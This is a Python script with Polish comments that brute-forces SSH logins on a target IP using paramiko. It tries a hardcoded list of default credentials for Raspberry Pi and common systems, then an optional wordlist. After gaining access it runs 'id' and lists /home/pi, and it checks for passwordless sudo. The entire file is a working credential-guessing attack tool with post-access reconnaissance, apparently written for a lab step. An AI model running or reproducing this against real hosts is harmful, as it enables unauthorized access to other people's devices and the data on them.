import paramiko
import sys
import time
import socket

# Domyślne poświadczenia dla Raspberry Pi i typowych usług
DEFAULT_CREDS = [
    ("pi", "raspberry"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "toor"),
    ("pi", "pi"),
    ("ubuntu", "ubuntu"),
    ("dietpi", "dietpi")
]

def try_ssh_login(host, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # print(f"[*] Próba logowania: {username}:{password}")
        client.connect(host, username=username, password=password, timeout=3)
        print(f"\n\033[92m[+] SUKCES! Znaleziono hasło: {username}:{password}\033[0m")
        return client
    except paramiko.AuthenticationException:
        return None
    except socket.error:
        print("[-] Błąd połączenia (socket error)")
        return None
    except Exception as e:
        # print(f"[-] Błąd: {e}")
        return None
    finally:
        client.close()

def execute_command(host, username, password, command="id"):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=username, password=password, timeout=5)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        print(f"[*] Wykonanie polecenia '{command}':")
        print(f"    {output}")
        
        # Sprawdzenie sudo
        if command == "id" or command == "whoami":
            stdin, stdout, stderr = client.exec_command("sudo -n true 2>/dev/null && echo 'SUDO_OK' || echo 'No_SUDO'")
            sudo_check = stdout.read().decode().strip()
            if "SUDO_OK" in sudo_check:
                print(f"\033[93m[!] Użytkownik ma dostęp do SUDO bez hasła!\033[0m")
            else:
                 print(f"[*] Użytkownik nie ma bezpośredniego dostępu sudo bez hasła.")
                 
    except Exception as e:
        print(f"[-] Nie udało się wykonać polecenia: {e}")
    finally:
        client.close()

def bruteforce(host, wordlist=None):
    print(f"[*] Rozpoczynanie ataku na SSH: {host}")
    print("[*] Sprawdzanie domyślnych poświadczeń...")
    
    found = False
    valid_cred = None
    
    # 1. Sprawdź Default Creds
    for user, password in DEFAULT_CREDS:
        client = try_ssh_login(host, user, password)
        if client:
            found = True
            valid_cred = (user, password)
            break
            
    # 2. Jeśli podano wordlistę i nie znaleziono w defaultach (opcjonalnie)
    if not found and wordlist:
        print(f"[*] Rozpoczynanie ataku słownikowego z pliku: {wordlist}")
        try:
            with open(wordlist, 'r') as f:
                for line in f:
                    # Zakładamy format user:pass lub samo pass (dla usera pi)
                    line = line.strip()
                    if ":" in line:
                        user, password = line.split(":", 1)
                    else:
                        user = "pi"
                        password = line
                        
                    client = try_ssh_login(host, user, password)
                    if client:
                        found = True
                        valid_cred = (user, password)
                        break
        except FileNotFoundError:
            print(f"[-] Nie znaleziono pliku słownika: {wordlist}")

    if found:
        print("-" * 50)
        print(f"[+] Dostęp uzyskany! {valid_cred[0]}:{valid_cred[1]}")
        print("[*] Weryfikacja uprawnień (krok 4.3)...")
        execute_command(host, valid_cred[0], valid_cred[1], "id")
        execute_command(host, valid_cred[0], valid_cred[1], "ls -la /home/pi")
    else:
        print("[-] Atak nieudany. Nie znaleziono pasujących poświadczeń.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Użycie: python3 {sys.argv[0]} <Target_IP> [wordlist_file]")
        sys.exit(1)
        
    target = sys.argv[1]
    wordlist_file = sys.argv[2] if len(sys.argv) > 2 else None
    
    bruteforce(target, wordlist_file)
